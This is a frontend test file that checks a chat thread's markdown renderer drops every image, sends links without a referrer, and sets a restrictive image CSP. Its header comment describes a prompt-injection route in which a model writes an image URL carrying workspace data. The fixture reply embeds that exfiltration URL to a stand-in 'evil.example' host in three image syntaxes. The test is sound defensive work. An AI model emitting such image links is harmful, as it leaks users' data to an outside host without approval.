// @vitest-environment happy-dom
import {
  AssistantRuntimeProvider,
  type ThreadMessageLike,
  useExternalStoreRuntime,
} from "@assistant-ui/react"
import { Thread } from "@workspace/ui/components/assistant/thread"
import { act, createElement } from "react"
import { createRoot } from "react-dom/client"
import { afterEach, beforeEach, expect, it, vi } from "vitest"
import { Route } from "../routes/__root"

/**
 * Model text reaches the thread's markdown renderer, and a prompt injection
 * can make the model write an image whose URL carries workspace data. The
 * browser would fetch it on render, with no approval. So the renderer drops
 * every image, whatever syntax asked for it.
 */
;(
  globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true

const LEAK = "https://evil.example/?d=+447700900123,hello@example.net"
const REPLY = `Done. ![s](${LEAK}) and ![r][ref], <img src="${LEAK}">

See [the preview](https://example.net/preview).

[ref]: ${LEAK}`

beforeEach(() => {
  vi.stubGlobal(
    "ResizeObserver",
    class {
      observe = () => undefined
      unobserve = () => undefined
      disconnect = () => undefined
    }
  )
  Element.prototype.scrollTo ??= () => undefined
})

let unmount: (() => Promise<void>) | undefined
afterEach(async () => {
  await unmount?.()
  vi.unstubAllGlobals()
})

const MESSAGES: ThreadMessageLike[] = [
  {
    id: "msg_reply",
    role: "assistant",
    content: [{ type: "text", text: REPLY }],
    status: { type: "complete", reason: "stop" },
  },
]

function Chat() {
  const runtime = useExternalStoreRuntime({
    messages: MESSAGES,
    convertMessage: (message: ThreadMessageLike) => message,
    onNew: async () => undefined,
  })
  return createElement(
    AssistantRuntimeProvider,
    { runtime },
    createElement(Thread, { autoFocus: false })
  )
}

async function render() {
  const container = document.createElement("div")
  document.body.appendChild(container)
  const root = createRoot(container)
  await act(async () => root.render(createElement(Chat)))
  unmount = async () => {
    await act(async () => root.unmount())
    container.remove()
  }
  await vi.waitFor(() => expect(container.textContent).toContain("Done."))
  return container
}

it("a reply renders no image, by any markdown syntax, and fetches nothing", async () => {
  const chat = await render()
  expect(chat.querySelectorAll("img")).toHaveLength(0)
  // Raw HTML shows as the text it is, never as an element.
  expect(chat.textContent).toContain("<img")
})

it("a link opens a new tab and sends no referrer", async () => {
  const chat = await render()
  const link = chat.querySelector<HTMLAnchorElement>(".aui-md a")
  expect(link?.href).toBe("https://example.net/preview")
  expect(link?.target).toBe("_blank")
  expect(link?.rel).toBe("noopener noreferrer")
})

it("the app lets images load only from itself, data URLs and preview hosts", async () => {
  const head = await Route.options.head?.({} as never)
  expect(head?.meta).toContainEqual({
    httpEquiv: "Content-Security-Policy",
    content: "img-src 'self' data: https://*.remeai.co.uk",
  })
})
